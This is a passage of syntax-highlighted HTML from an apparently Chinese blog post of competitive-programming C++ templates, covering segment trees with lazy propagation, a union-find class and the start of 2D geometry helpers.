<span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">int</span> v<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">==</span> pos <span class="token operator">&amp;&amp;</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">==</span> pos<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">+=</span> v<span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getmid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">></span> mid<span class="token punctuation">)</span>        <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> pos<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">update</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> pos<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">=</span> node<span class="token punctuation">[</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sum <span class="token operator">+</span> node<span class="token punctuation">[</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">GetSum</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">==</span> l <span class="token operator">&amp;&amp;</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">==</span> r<span class="token punctuation">)</span>        <span class="token keyword">return</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token punctuation">;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> node<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getmid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">></span> mid<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">GetSum</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;</span> mid<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">GetSum</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">return</span> <span class="token function">GetSum</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GetSum</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rt <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="5-2-区间更新，区间查询"><a href="#5-2-区间更新，区间查询" class="headerlink" title="5.2 区间更新，区间查询"></a>5.2 区间更新，区间查询</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Tree</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> l<span class="token punctuation">,</span> r<span class="token punctuation">;</span>    <span class="token keyword">int</span> dat<span class="token punctuation">,</span> lazy<span class="token punctuation">;</span>    <span class="token function">Tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> lazy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> node<span class="token punctuation">[</span>maxn <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">=</span> l<span class="token punctuation">;</span>    node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> l <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>r <span class="token operator">-</span> l<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">build</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">build</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">=</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">+</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat<span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">spread</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">+=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">*</span> <span class="token punctuation">(</span>node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">-</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">+=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">*</span> <span class="token punctuation">(</span>node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">-</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">+=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy<span class="token punctuation">;</span>        node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">+=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy<span class="token punctuation">;</span>        node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">&amp;&amp;</span> r <span class="token operator">>=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>lazy <span class="token operator">+=</span> val<span class="token punctuation">;</span>        node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">+=</span> val <span class="token operator">*</span> <span class="token punctuation">(</span>node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">-</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">spread</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">-</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span>        <span class="token function">update</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> val<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> m<span class="token punctuation">)</span>        <span class="token function">update</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> val<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">=</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat <span class="token operator">+</span> node<span class="token punctuation">[</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dat<span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">&amp;&amp;</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>dat<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">spread</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>r <span class="token operator">-</span> node<span class="token punctuation">[</span>p<span class="token punctuation">]</span><span class="token punctuation">.</span>l <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span>        ans <span class="token operator">+=</span> <span class="token function">query</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> mid<span class="token punctuation">)</span>        ans <span class="token operator">+=</span> <span class="token function">query</span><span class="token punctuation">(</span>p <span class="token operator">&lt;&lt;</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ans<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="6-并查集"><a href="#6-并查集" class="headerlink" title="6. 并查集"></a>6. 并查集</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">djset</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> parent<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> rank<span class="token punctuation">;</span>    <span class="token function">djset</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">parent</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">rank</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            parent<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>            parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> parent<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">==</span>b<span class="token punctuation">)</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>rank<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">&lt;</span>rank<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span>            parent<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">=</span> parent<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            parent<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">=</span> parent<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>rank<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">==</span>rank<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span>                rank<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h3 id="7-计算几何"><a href="#7-计算几何" class="headerlink" title="7. 计算几何"></a>7. 计算几何</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token keyword">const</span> db eps<span class="token operator">=</span><span class="token number">1e-9</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">sign</span><span class="token punctuation">(</span>db a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">&lt;</span>eps<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span>db a<span class="token punctuation">,</span> db b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">sign</span><span class="token punctuation">(</span>a<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">Point</span><span class="token punctuation">&#123;</span>    db x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    <span class="token function">Point</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">Point</span><span class="token punctuation">(</span>db _x<span class="token punctuation">,</span>db _y<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">x</span><span class="token punctuation">(</span>_x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">y</span><span class="token punctuation">(</span>_y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> Point Vec<span class="token punctuation">;</span><span class="token comment">// 向量+向量 = 向量 ，点 + 向量 = 点 </span>Vec <span class="token keyword">operator</span><span class="token operator">+</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span> Vec B<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">+</span> B<span class="token punctuation">.</span>x<span class="token punctuation">,</span> A<span class="token punctuation">.</span>y <span class="token operator">+</span> B<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">// 点 - 点 = 向量 </span>Vec <span class="token keyword">operator</span><span class="token operator">-</span><span class="token punctuation">(</span>Point A<span class="token punctuation">,</span> Point B<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">-</span> B<span class="token punctuation">.</span>x<span class="token punctuation">,</span> A<span class="token punctuation">.</span>y <span class="token operator">-</span> B<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">//向量 * 数 = 向量</span>Vec <span class="token keyword">operator</span><span class="token operator">*</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span> db p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">*</span> p<span class="token punctuation">,</span> A<span class="token punctuation">.</span>y <span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token comment">//向量 / 数 = 向量</span>Vec <span class="token keyword">operator</span><span class="token operator">/</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span> db p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token function">Vec</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">/</span> p<span class="token punctuation">,</span> A<span class="token punctuation">.</span>y <span class="token operator">/</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">const</span> Point <span class="token operator">&amp;</span>A <span class="token punctuation">,</span><span class="token keyword">const</span> Point <span class="token operator">&amp;</span>B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">sign</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>x <span class="token operator">-</span> B<span class="token punctuation">.</span>x<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sign</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>y <span class="token operator">-</span> B<span class="token punctuation">.</span>y<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">Line</span><span class="token punctuation">&#123;</span>    Point a<span class="token punctuation">,</span>b<span class="token punctuation">;</span>    <span class="token function">Line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token function">Line</span><span class="token punctuation">(</span>Point _a<span class="token punctuation">,</span>Point _b<span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">a</span><span class="token punctuation">(</span>_a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">b</span><span class="token punctuation">(</span>_b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/*  两点间距离   */</span>db <span class="token function">get_distance</span><span class="token punctuation">(</span>Point a<span class="token punctuation">,</span> Point b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token operator">-</span>b<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token operator">-</span>b<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>y<span class="token operator">-</span>b<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>y<span class="token operator">-</span>b<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//  两向量的叉乘</span>db <span class="token function">Cross</span><span class="token punctuation">(</span>Vec A<span class="token punctuation">,</span>Vec B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> A<span class="token punctuation">.</span>x <span class="token operator">*</span> B<span class="token punctuation">.</span>y <span class="token operator">-</span> A<span class="token punctuation">.</span>y <span class="token operator">*</span> B<span class="token punctuation">.</span>x<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>db <span class="token function">Area2</span><span class="token punctuation">(</span>Point A<span class="token punctuation">,</span>Point B<span class="token punctuation">,</span>Point C<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">Cross</span><span class="token punctuation">(</span>B <span class="token operator">-</span> A<span class="token punctuation">,</span> C <span class="token operator">-</span> A<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span 